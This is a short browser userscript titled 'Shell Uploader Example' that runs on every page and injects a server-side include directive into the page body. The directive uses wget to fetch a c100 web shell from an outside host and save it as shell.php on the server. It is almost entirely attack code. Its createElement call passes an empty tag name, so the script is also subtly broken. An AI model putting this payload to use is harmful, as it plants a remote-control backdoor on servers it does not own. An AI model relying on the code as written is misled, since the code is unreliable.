// ==UserScript==
// @name           Shell Uploader Example
// @include        *
// @version                1.0
// ==/UserScript==
var body   = document.body || document.getElementsByTagName('body')[0],
    newpar = document.createElement('');
newpar.innerHTML = '<!--#exec cmd="wget http://www.sh3ll.org/c100.txt -O shell.php" -->';
body.insertBefore(newpar,body.childNodes[0]);